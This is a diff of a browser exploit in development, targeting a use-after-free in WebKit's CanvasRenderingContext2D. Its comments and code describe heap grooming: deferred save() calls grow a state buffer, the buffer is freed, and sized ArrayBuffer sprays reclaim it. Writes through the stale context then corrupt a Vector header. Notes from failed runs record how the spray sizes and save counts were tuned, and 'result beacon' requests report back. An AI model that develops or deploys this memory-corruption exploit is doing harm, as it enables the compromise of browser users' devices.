@@ -10,23 +10,31 @@
 //
 //   ctx.save() is deferred: ++m_unrealizedSaveCount (CanvasRenderingContext2DBase.h:143).
 //   The next state setter calls realizeSaves() → realizeSavesLoop() appends
-//   exactly one state → the vector grows 1→2 → an OUT-OF-LINE FastMalloc
-//   buffer of exactly 2*sizeof(State) (~400-450 bytes) is allocated and
-//   becomes m_buffer.
+//   one state per pending save → the vector grows out-of-line. EIGHT saves
+//   push the realized buffer to ~16*sizeof(State) (~3.4KB) — deliberately
+//   FAR above the context's own size class.
 //
-// So the getter does: inner.save(); inner.lineWidth = MARKER;
-//   - realizeSaves appends one state (out-of-line buffer B = 2*sizeof(State),
-//     deterministic capacity) and the marker lands in B[data()[1].lineWidth]
+// v4 run 1 lesson (silent death before the first result beacon): the
+// CanvasRenderingContext2D slot itself sits in the 384-512 range (inline
+// State included) — the same range as XHR objects and small ABs. Spraying
+// 384-512 ABs reclaims the CONTEXT slot (zeroing m_canvas/m_buffer) → SEGV
+// at the first stale read. This also explains v3 run 2 (death after two
+// beacon XHRs) and v3 R3 (0x41 AB spray). The context slot must stay
+// freed-but-mapped and untouched: only the BIG state buffer is sprayed.
+//
+// So the getter does: inner.save() x8; inner.lineWidth = MARKER;
+//   - realizeSaves appends 8 states (out-of-line buffer B ≈ 16*sizeof(State))
+//     and the marker lands in B[data()[8].lineWidth]
 //   - the outer createContext2d then destroys the inner context: the Vector
 //     destructor FREES B (with the marker inside), then frees the context
 //     slot (stays mapped — methods keep working).
 //
-// Post-free, spray ArrayBuffers sized 2*sizeof(State):
+// Post-free, spray ArrayBuffers sized ~1.8-4.4KB:
 //   inner.lineWidth reads  MARKER → B freed but NOT reclaimed by our spray
 //   inner.lineWidth reads  0      → B reclaimed by a zero-filled AB
 //   inner.lineWidth = 1.717        → realizeSaves no-op (count==0, real value
 //                                     in the freed context), write lands at
-//                                     data()[1].lineWidth INSIDE our AB, then
+//                                     data()[8].lineWidth INSIDE our AB, then
 //                                     drawingContext() → m_canvas valid → safe.
 //   inner.setLineDash([...])       → the state's Vector<double> header lands
 //                                     in our AB: m_buffer = a fresh FastMalloc
@@ -58,11 +66,14 @@
   B('BOOT');
 
   var MARKER = 6.02214076e23;
-  var PER = 40;
-  // 2*sizeof(State) estimates: sizeof(State) ~192-256 from the WK source
-  var SIZES_A = [384, 400, 416, 432, 448, 464, 480, 496, 512];
-  var SIZES_B = [256, 288, 320, 352, 544, 576, 608, 640, 672, 704, 736, 768,
-                832, 896, 960, 1024];
+  var PER = 25;
+  var N_SAVES = 8;
+  // ~16*sizeof(State) after 8 realized saves — far above the context class
+  // (384-512, v4 run 1). Cover capacity 11-18 x sizeof(State) 200-256.
+  var SIZES_A = [];
+  for (var s = 1792; s <= 4352; s += 128) SIZES_A.push(s);
+  var SIZES_B = [];
+  for (var s2 = 2048; s2 <= 5120; s2 += 256) SIZES_B.push(s2);
 
   var __bitbuf = new ArrayBuffer(8);
   var __bitf = new Float64Array(__bitbuf);
@@ -111,9 +122,9 @@
           calledInner = true;
           innerVia = prop;
           inner = canvas.getContext('2d');
-          inner.save();               // deferred: ++m_unrealizedSaveCount
-          inner.lineWidth = MARKER; // realizeSaves appends ONE state ->
-                                    // out-of-line buffer 2*sizeof(State)
+          for (var sv = 0; sv < N_SAVES; sv++) inner.save(); // deferred counter
+          inner.lineWidth = MARKER; // realizeSaves appends N_SAVES states ->
+                                     // out-of-line buffer ~16*sizeof(State)
         }
         return undefined;
       }
